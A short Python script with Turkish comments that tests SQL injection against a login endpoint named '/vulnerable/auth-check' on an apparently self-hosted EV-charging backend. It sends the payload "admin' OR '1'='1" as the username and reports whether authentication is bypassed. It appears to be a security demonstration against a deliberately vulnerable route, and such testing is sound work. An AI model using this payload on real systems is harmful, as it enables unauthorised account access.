import requests

# Hedef Backend Adresi
BACKEND = "https://evcs-backend-samet.onrender.com"

print("🎯 SQL Injection Test\n")

# 1. Normal Giriş Denemesi (Başarısız olması beklenir)
normal = {
    "username": "admin",
    "password": "12345"
}

print("Normal giriş deneniyor...")
r = requests.get(f"{BACKEND}/vulnerable/auth-check", params=normal)
print(f"Normal giriş sonucu: {r.json()}")
print("-" * 30)

# 2. SQL INJECTION SALDIRISI
# ' OR '1'='1 kodu, veritabanındaki sorguyu her zaman "DOĞRU" yapmaya yarar.
sql_inject = {
    "username": "admin' OR '1'='1",
    "password": "rastgele_bir_sey"
}

print("💉 SQL Injection deneniyor...")
r = requests.get(f"{BACKEND}/vulnerable/auth-check", params=sql_inject)
result = r.json()

print(f"Saldırı Sonucu: {result}")

# Başarı Kontrolü
if result.get("authenticated"):
    print("\n✅✅✅ BAŞARILI! SİSTEME SIZDIN! ✅✅✅")
    print(f"Kazanılan Rol: {result.get('role')}")
else:
    print("\n❌ Başarısız oldu.")